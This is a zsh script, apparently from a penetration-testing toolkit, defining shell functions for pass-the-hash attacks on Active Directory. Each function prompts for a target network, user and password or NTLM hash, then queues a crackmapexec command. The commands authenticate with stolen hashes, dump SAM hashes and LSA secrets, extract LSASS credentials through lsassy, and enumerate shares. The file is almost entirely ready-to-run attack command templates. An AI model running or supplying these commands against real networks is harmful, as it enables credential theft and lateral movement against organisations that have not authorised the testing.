#!/usr/bin/env zsh

############################################################# 
# nb-ad-pth
#############################################################
nb-ad-pth-help() {
    cat << "DOC" | bat --plain --language=help

nb-ad-pth
------------
The nb-ad-pth namespace contains commands for pass-the-hash attack on Active Directory DC server.

Commands
--------
nb-ad-pth-install         installs dependencies
nb-ad-pth-pass            pass the password
nb-ad-pth-exploit         pth exploit command
nb-ad-pth-sam             dump SAM hashes
nb-ad-pth-enum            enumerate shares
nb-ad-pth-lsa             use CME to dump LSA
nb-ad-pth-lsassy          use CME to dump LSASSY

DOC
}

nb-ad-pth-install() {
    __info "Running $0..."
    __pkgs crackmapexec
}

nb-ad-pth-pass() {
    __check-project
    nb-vars-set-network
    echo
    __ask "Enter target AD domain (must also be set in your hosts file)"
    nb-vars-set-domain
    echo
    __ask "Enter a user account"
    __check-user
    echo

    __ask "Do you want to log in using a password or a hash? (p/h)"
    local login && __askvar login "LOGIN_OPTION"

    if [[ $login == "p" ]]; then
        echo
        __ask "Enter a password for authentication"
        __check-pass
        print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -d ${__DOMAIN} -p ${__PASS} --local-auth"
    elif [[ $login == "h" ]]; then
        echo
        __ask "Enter the NTLM hash for authentication"
        __check-hash
        print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -d ${__DOMAIN} -H ${__HASH} --local-auth"
    else
        echo
        __err "Invalid option. Please choose 'p' for password or 'h' for hash."
    fi
}

nb-ad-pth-exploit() {
    __check-project
    nb-vars-set-network
    echo
    __ask "Enter a user account"
  	__check-user
    echo
  	__ask "Enter a NTLM hash"
  	__check-hash

	print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -H ${__HASH} --local-auth"
}

nb-ad-pth-sam() {
    __check-project
    nb-vars-set-network
    echo
    __ask "Enter a user account"
	  __check-user
    echo
	  __ask "Enter a NTLM hash"
	  __check-hash

	print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -H ${__HASH} --local-auth --sam"
}

nb-ad-pth-enum() {
    __check-project
    nb-vars-set-network
    echo
    __ask "Enter a user account/user list"
	  __check-user
    echo
	  __ask "Enter a NTLM hash"
	  __check-hash

	print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -H ${__HASH} --local-auth --shares"
}

nb-ad-pth-lsa() {
    __check-project
    nb-vars-set-network
    echo
    __ask "Enter a user account"
	  __check-user
    echo
	  __ask "Enter a NTLM hash"
	  __check-hash

	print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -H ${__HASH} --local-auth --lsa"
}

nb-ad-pth-lsassy() {
    __check-project
    nb-vars-set-network
    echo
    __ask "Enter a user account"
	  __check-user
    echo
	  __ask "Enter a NTLM hash"
	  __check-hash

	print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -H ${__HASH} --local-auth -M lsassy"
}
